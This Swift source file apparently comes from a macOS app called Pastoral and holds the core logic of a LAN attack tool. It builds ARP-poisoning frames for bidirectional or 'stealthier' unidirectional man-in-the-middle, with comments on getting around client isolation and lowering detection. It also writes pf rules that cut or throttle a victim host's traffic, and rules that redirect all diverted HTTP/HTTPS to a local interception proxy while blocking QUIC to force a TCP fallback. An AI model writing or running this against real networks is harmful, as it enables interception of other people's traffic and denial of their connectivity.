import Foundation

// MARK: - ARP spoof plan (pure logic, testable)
//
// Given a target, a gateway, and our own MAC, produce the ARP reply frames
// that constitute bidirectional spoofing, and the frames that restore the
// truthful entries. Pure functions — no I/O, no sockets, fully testable.

/// A planned ARP spoof: the frames to send for poisoning, and the frames
/// to send for restoration. Produced by `ARPSpoofPlanner`.
public struct ARPSpoofPlan: Equatable, Sendable {
    /// Frames to send to the target: "gateway IP is at our MAC".
    public let poisonTarget: [UInt8]
    /// Frames to send to the gateway: "target IP is at our MAC".
    /// Empty in unidirectional mode (we only poison the target).
    public let poisonGateway: [UInt8]
    /// Frames to send to the target to restore: "gateway IP is at gateway MAC".
    public let restoreTarget: [UInt8]
    /// Frames to send to the gateway to restore: "target IP is at target MAC".
    /// Empty in unidirectional mode.
    public let restoreGateway: [UInt8]
    /// The target IP (4 bytes) — needed for gratuitous ARP.
    public let targetIP: [UInt8]
    /// The gateway IP (4 bytes) — needed for gratuitous ARP.
    public let gatewayIP: [UInt8]
    /// Whether this plan poisons both directions or only the target.
    public let bidirectional: Bool

    /// True when this plan only poisons the target (gateway is left alone,
    /// so return traffic flows directly gateway→target, bypassing us).
    public var isUnidirectional: Bool { !bidirectional }
}

/// Direction of an ARP spoof. `.bidirectional` poisons both the target and
/// the gateway (full MITM — we see both directions). `.unidirectional` only
/// poisons the target: the target sends its outbound traffic to us, but
/// the gateway still knows the target's real MAC, so return traffic
/// bypasses us. Unidirectional is enough to force the target's outbound
/// path through us (the "force path" lever) and is stealthier — the
/// gateway never sees inconsistent ARP, reducing detection surface.
public enum ARPSpoofDirection: String, Codable, Equatable, Sendable {
    case bidirectional
    case unidirectional
}

/// Pure-logic planner for ARP spoofing (bidirectional or unidirectional).
public enum ARPSpoofPlanner {
    /// Build a spoof plan for a target.
    /// - Parameters:
    ///   - targetMAC: the real MAC of the target host
    ///   - targetIP: the IPv4 of the target (4 bytes)
    ///   - gatewayMAC: the real MAC of the gateway
    ///   - gatewayIP: the IPv4 of the gateway (4 bytes)
    ///   - ourMAC: our MAC (the Mac running Pastoral)
    ///   - direction: `.bidirectional` (default, full MITM) or
    ///     `.unidirectional` (only divert the target's outbound path).
    public static func plan(targetMAC: MAC, targetIP: [UInt8],
                            gatewayMAC: MAC, gatewayIP: [UInt8],
                            ourMAC: MAC,
                            direction: ARPSpoofDirection = .bidirectional) -> ARPSpoofPlan {
        // Poison target: tell the target that the gateway is at our MAC.
        // Use broadcast (not unicast) because WiFi APs may filter unicast
        // frames between stations (client isolation).
        let poisonTarget = ARPFrame.replyBroadcast(
            senderMAC: ourMAC, senderIP: gatewayIP,   // "I am the gateway"
            targetMAC: targetMAC, targetIP: targetIP
        )
        // Restore target: tell the target the real gateway MAC.
        let restoreTarget = ARPFrame.reply(
            senderMAC: gatewayMAC, senderIP: gatewayIP,  // "I am the gateway (real)"
            targetMAC: targetMAC, targetIP: targetIP
        )

        switch direction {
        case .bidirectional:
            // Poison gateway: tell the gateway that the target is at our MAC.
            let poisonGateway = ARPFrame.replyBroadcast(
                senderMAC: ourMAC, senderIP: targetIP,    // "I am the target"
                targetMAC: gatewayMAC, targetIP: gatewayIP
            )
            // Restore gateway: tell the gateway the real target MAC.
            let restoreGateway = ARPFrame.reply(
                senderMAC: targetMAC, senderIP: targetIP,    // "I am the target (real)"
                targetMAC: gatewayMAC, targetIP: gatewayIP
            )
            return ARPSpoofPlan(
                poisonTarget: poisonTarget,
                poisonGateway: poisonGateway,
                restoreTarget: restoreTarget,
                restoreGateway: restoreGateway,
                targetIP: targetIP,
                gatewayIP: gatewayIP,
                bidirectional: true
            )
        case .unidirectional:
            // Only poison the target. The gateway is left untouched: it
            // keeps the target's real MAC, so replies flow directly back
            // to the target. We only intercept the target's outbound path.
            // Empty frames signal "skip" to the spoofer loop.
            return ARPSpoofPlan(
                poisonTarget: poisonTarget,
                poisonGateway: [],
                restoreTarget: restoreTarget,
                restoreGateway: [],
                targetIP: targetIP,
                gatewayIP: gatewayIP,
                bidirectional: false
            )
        }
    }
}

// MARK: - pf anchor management (pure logic, testable)
//
// The anchor "com.pastoral/kill" lives inside /etc/pf.conf. We never
// overwrite pf.conf; we append the anchor include line if absent and
// restore the original on uninstall. The drop rules go into the anchor
// via `pfctl -a com.pastoral/kill -f`.

/// Manages the pf anchor include line in /etc/pf.conf. Pure logic over
/// the file contents — testable without touching the real file.
public enum PFAnchorManager {
    /// The anchor name used for the Kill feature.
    public static let killAnchor = "com.pastoral/kill"
    /// The anchor name used for the Sheep feature (step 5).
    public static let sheepAnchor = "com.pastoral/sheep"
    /// The anchor name used for selective Kill rules (phase 3).
    public static let selectiveAnchor = "com.pastoral/selective"
    /// The anchor name used for dummynet pipe configs (phase 3).
    public static let dummynetAnchor = "com.pastoral/dummynet"

    /// The include line to add to pf.conf for the kill anchor.
    public static let killIncludeLine = #"anchor "com.pastoral/kill""#

    /// The include line to add to pf.conf for the sheep anchor.
    public static let sheepIncludeLine = #"anchor "com.pastoral/sheep""#

    /// The include line to add to pf.conf for the selective-kill anchor.
    public static let selectiveIncludeLine = #"anchor "com.pastoral/selective""#

    /// The include line to add to pf.conf for the dummynet anchor.
    public static let dummynetIncludeLine = #"dummynet-anchor "com.pastoral/dummynet""#

    /// Check if the sheep anchor include line is already present in pf.conf.
    public static func hasSheepAnchor(in contents: String) -> Bool {
        contents.contains(sheepIncludeLine)
    }

    /// Add the sheep anchor include line to pf.conf if absent.
    /// Re-uses the canonical ordering so the new line never lands before
    /// the selective/dummynet anchors (which must evaluate first).
    public static func ensureSheepAnchor(in contents: String) -> String {
        orderedPastoralAnchors(in: contents, ensuring: [sheepIncludeLine])
    }

    /// The four anchor include lines that Pastoral may add to pf.conf.
    public static let allIncludeLines: [String] = [
        killIncludeLine,
        selectiveIncludeLine,
        dummynetIncludeLine,
        sheepIncludeLine,
    ]

    /// Canonical evaluation order for the pastoral anchors. Order in
    /// pf.conf IS evaluation order: the selective kill (drop/rate-limit)
    /// and dummynet rules must run BEFORE the sheep wildcard `rdr`, or a
    /// redirected packet never reaches them and Kill/Lobo cuts stop
    /// biting while Sheep is active. Kill sits first (full cuts are the
    /// strongest claim on a target).
    public static let canonicalOrder: [String] = [
        killIncludeLine,
        selectiveIncludeLine,
        dummynetIncludeLine,
        sheepIncludeLine,
    ]

    private static func isPastoralAnchorLine(_ trimmed: String) -> Bool {
        allIncludeLines.contains(trimmed)
    }

    /// Rewrite `contents` so every pastoral anchor include line present
    /// (or listed in `ensuring`) appears exactly once, in canonical
    /// order, at the position of the first such line (end of file when
    /// none existed yet). Everything else is preserved verbatim.
    public static func orderedPastoralAnchors(in contents: String,
                                              ensuring: [String]) -> String {
        let lines = contents.components(separatedBy: "\n")
        let existingLines = lines.filter { isPastoralAnchorLine($0.trimmingCharacters(in: .whitespaces)) }
        let nonPastoral = lines.filter { !isPastoralAnchorLine($0.trimmingCharacters(in: .whitespaces)) }
        // Lines to carry forward: whatever already exists PLUS whatever
        // the caller is ensuring, deduped, in canonical order.
        let wantedSet = Set(existingLines).union(ensuring).intersection(Set(canonicalOrder))
        let wanted = canonicalOrder.filter { wantedSet.contains($0) }
        guard !wanted.isEmpty else { return contents }
        // Insertion point: where the first pastoral line used to sit.
        let firstIdx = lines.firstIndex { isPastoralAnchorLine($0.trimmingCharacters(in: .whitespaces)) }
        var out: [String]
        if let i = firstIdx {
            out = Array(nonPastoral[0..<i]) + wanted + Array(nonPastoral[i...])
        } else {
            out = nonPastoral + wanted
        }
        var result = out.joined(separator: "\n")
        if !result.hasSuffix("\n") { result.append("\n") }
        return result
    }

    /// Remove the sheep anchor include line from pf.conf.
    public static func removeSheepAnchor(from contents: String) -> String {
        var lines = contents.components(separatedBy: "\n")
        lines.removeAll { $0.trimmingCharacters(in: .whitespaces) == sheepIncludeLine }
        return lines.joined(separator: "\n")
    }

    /// Build the pf rules for the transparent (no-MITM) Sheep proxy: a
    /// wildcard rdr redirecting ALL TCP port 80/443 entering `interface`
    /// to the local proxy on 127.0.0.1. Whichever LAN traffic flows
    /// through us (diverted hosts) is captured — no per-target list.
    /// When `forceTCPFallback` is on, a UDP/443 `block return` makes QUIC
    /// (HTTP/3) clients fall back to TCP — the rdr only catches TCP, and
    /// `block return` answers with port-unreachable so the fallback is
    /// immediate instead of a timeout. `localIP` is excluded from the
    /// QUIC block so the Mac's own HTTP/3 keeps working.
    public static func transparentRules(interface: String = "en0",
                                        proxyPort: Int = 8080,
                                        forceTCPFallback: Bool = true,
                                        localIP: String? = nil) -> String {
        var rules =
            "rdr pass on \(interface) inet proto tcp from any to any port { 80, 443 } -> 127.0.0.1 port \(proxyPort)"
        if forceTCPFallback {
            let source = localIP.map { "! \($0)" } ?? "any"
            rules += "\nblock return out quick on \(interface) proto udp from \(source) to any port 443"
        }
        return rules
    }

    /// Check if the anchor include line is already present in pf.conf.
    public static func hasKillAnchor(in contents: String) -> Bool {
        contents.contains(killIncludeLine)
    }

    /// Add the kill anchor include line to pf.conf if absent. Returns the
    /// new contents. Never overwrites existing content — only appends.
    public static func ensureKillAnchor(in contents: String) -> String {
        if hasKillAnchor(in: contents) { return contents }
        var result = contents
        if !result.hasSuffix("\n") { result.append("\n") }
        result.append(killIncludeLine + "\n")
        return result
    }

    /// Remove the kill anchor include line from pf.conf. Returns the new
    /// contents (used for uninstall/restore).
    public static func removeKillAnchor(from contents: String) -> String {
        var lines = contents.components(separatedBy: "\n")
        lines.removeAll { $0.trimmingCharacters(in: .whitespaces) == killIncludeLine }
        return lines.joined(separator: "\n")
    }

    /// Build the pf rules to drop traffic from a target IP (block in/out).
    public static func dropRules(for targetIPs: [String]) -> String {
        targetIPs.map { ip in
            "block quick from \(ip) to any\nblock quick to \(ip)"
        }.joined(separator: "\n")
    }

    /// Build the pf rules to drop traffic from a single target IP.
    public static func dropRule(for targetIP: String) -> String {
        "block quick from \(targetIP) to any\nblock quick to \(targetIP)\n"
    }
}

// MARK: - Selective Kill policies (phase 3)

/// A selective Kill policy: drop or rate-limit traffic from a target IP,
/// optionally filtered by port, protocol, and/or DSCP. When `rateLimitKbit`
/// is nil, the policy drops matching traffic; when set, it shapes matching
/// traffic to the given bandwidth via dummynet instead of dropping.
public struct KillPolicy: Codable, Equatable, Sendable {
    public let targetIP: String
    /// Ports to match (empty = all ports).
    public let ports: [UInt16]
    /// Protocol filter (nil = both tcp and udp).
    public let proto: KillProto?
    /// DSCP value to match (nil = any DSCP).
    public let dscp: UInt8?
    /// If set, rate-limit matching traffic to this bandwidth (Kbit/s)
    /// instead of dropping it. Uses a dummynet pipe.
    public let rateLimitKbit: Int?

    public init(targetIP: String,
                ports: [UInt16] = [],
                proto: KillProto? = nil,
                dscp: UInt8? = nil,
                rateLimitKbit: Int? = nil) {
        self.targetIP = targetIP
        self.ports = ports
        self.proto = proto
        self.dscp = dscp
        self.rateLimitKbit = rateLimitKbit
    }

    /// A stable identifier for the dummynet pipe assigned to this policy.
    /// Derived from the target IP so each host gets a deterministic pipe.
    public var pipeID: Int {
        // Hash the IP octets into a 1..65535 range.
        let octets = targetIP.split(separator: ".").compactMap { UInt16($0) }
        guard octets.count == 4 else { return 1 }
        return Int(octets[2]) * 256 + Int(octets[3]) + 1
    }
}

/// Protocol filter for selective Kill rules.
public enum KillProto: String, Codable, Equatable, Sendable {
    case tcp
    case udp
}

/// Pure rule builders for selective Kill policies. All logic is testable
/// without touching pf.
public enum PFSelectiveRules {

    // MARK: - Drop rules

    /// Build pf `block` rules for a selective drop policy. Returns one or
    /// more `block quick` lines matching the policy's filters.
    public static func dropRule(for policy: KillPolicy) -> String {
        let protoClause = policy.proto.map { " proto \($0.rawValue)" } ?? ""
        let dscpClause = policy.dscp.map { " tos 0x\(String($0, radix: 16))" } ?? ""
        if policy.ports.isEmpty {
            // No port filter: drop all matching traffic in both directions.
            return "block quick\(protoClause)\(dscpClause) from \(policy.targetIP) to any\n"
                 + "block quick\(protoClause)\(dscpClause) to \(policy.targetIP)\n"
        }
        // Port filter: emit one block per port (pf `port` is singular in
        // the rule grammar for clarity; multiple ports use `{ a, b }`).
        let portList = "{ " + policy.ports.map(String.init).joined(separator: ", ") + " }"
        return "block quick\(protoClause)\(dscpClause) from \(policy.targetIP) to any port \(portList)\n"
             + "block quick\(protoClause)\(dscpClause) to \(policy.targetIP) port \(portList)\n"
    }

    /// Build pf `block` rules for multiple selective policies.
    public static func dropRules(for policies: [KillPolicy]) -> String {
        policies.map { dropRule(for: $0) }.joined(separator: "\n")
    }

    // MARK: - Rate-limit rules (dummynet)

    /// Build pf rules that send matching traffic to a dummynet pipe for
    /// rate limiting, instead of dropping it. The pipe config line is
    /// returned separately (it goes in the dummynet anchor).
    public static func rateLimitRule(for policy: KillPolicy) -> String {
        guard let kbit = policy.rateLimitKbit else { return dropRule(for: policy) }
        let protoClause = policy.proto.map { " proto \($0.rawValue)" } ?? ""
        let dscpClause = policy.dscp.map { " tos 0x\(String($0, radix: 16))" } ?? ""
        let pipe = policy.pipeID
        if policy.ports.isEmpty {
            return "pass in quick\(protoClause)\(dscpClause) from \(policy.targetIP) to any keep state dnpipe \(pipe)\n"
                 + "pass out quick\(protoClause)\(dscpClause) to \(policy.targetIP) keep state dnpipe \(pipe)\n"
        }
        let portList = "{ " + policy.ports.map(String.init).joined(separator: ", ") + " }"
        return "pass in quick\(protoClause)\(dscpClause) from \(policy.targetIP) to any port \(portList) keep state dnpipe \(pipe)\n"
             + "pass out quick\(protoClause)\(dscpClause) to \(policy.targetIP) port \(portList) keep state dnpipe \(pipe)\n"
    }

    /// Build the dummynet pipe configuration line for a rate-limit policy.
    public static func pipeConfig(for policy: KillPolicy) -> String? {
        guard let kbit = policy.rateLimitKbit else { return nil }
        return "pipe \(policy.pipeID) config bw \(kbit)Kbit/s"
    }

    /// Build the dummynet pipe configuration for multiple policies (deduped
    /// by pipe ID).
    public static func pipeConfigs(for policies: [KillPolicy]) -> String {
        var seen = Set<Int>()
        var lines: [String] = []
        for p in policies {
            guard let line = pipeConfig(for: p) else { continue }
            if seen.insert(p.pipeID).inserted { lines.append(line) }
        }
        return lines.joined(separator: "\n")
    }
}

// MARK: - State store (crash recovery)
//
// ~/Library/Application Support/Pastoral/state.json tracks whether the app
// left the network in a dirty state (spoofing active when it crashed/quit).
// On next boot, if dirty, the app warns the user and triggers a restore.

/// Persistent state for crash recovery. Written to state.json.
public struct PastoralState: Codable, Equatable, Sendable {
    /// True when spoofing is active (any host is being killed). Set false
    /// after a clean restore. If the app crashes with dirty=true, the next
    /// launch warns the user.
    public var dirty: Bool
    /// IPs currently being spoofed (for restore on next boot).
    public var spoofedIPs: [String]
    /// Optional for compatibility with sessions saved by older versions.
    public var selectiveIPs: [String]?
    /// Prior IP forwarding state (to restore on disable).
    public var priorForwarding: Bool?
    /// Timestamp of the last state change.
    public var timestamp: Date

    public init(dirty: Bool = false, spoofedIPs: [String] = [],
                priorForwarding: Bool? = nil, timestamp: Date = .now, selectiveIPs: [String]? = nil) {
        self.dirty = dirty
        self.spoofedIPs = spoofedIPs
        self.selectiveIPs = selectiveIPs
        self.priorForwarding = priorForwarding
        self.timestamp = timestamp
    }

    public static let clean = PastoralState()
}

/// Reads/writes PastoralState to disk. The path is injected for testability.
public struct StateStore {
    let path: String

    public init(path: String) {
        self.path = path
    }

    /// Default path: ~/Library/Application Support/Pastoral/state.json
    public static var defaultPath: String {
        let home = NSHomeDirectory()
        return "\(home)/Library/Application Support/Pastoral/state.json"
    }

    public func load() -> PastoralState {
        guard let data = try? Data(contentsOf: URL(fileURLWithPath: path)),
              let state = try? JSONDecoder().decode(PastoralState.self, from: data) else {
            return .clean
        }
        return state
    }

    public func save(_ state: PastoralState) throws {
        let dir = (path as NSString).deletingLastPathComponent
        try? FileManager.default.createDirectory(atPath: dir, withIntermediateDirectories: true)
        let data = try JSONEncoder().encode(state)
        try data.write(to: URL(fileURLWithPath: path), options: .atomic)
    }

    /// Mark dirty (spoofing started) and persist.
    public func markDirty(spoofedIPs: [String], priorForwarding: Bool? = nil) throws {
        try save(PastoralState(dirty: true, spoofedIPs: spoofedIPs,
                               priorForwarding: priorForwarding))
    }

    /// Mark clean (restored) and persist.
    public func markClean() throws {
        try save(.clean)
    }
}
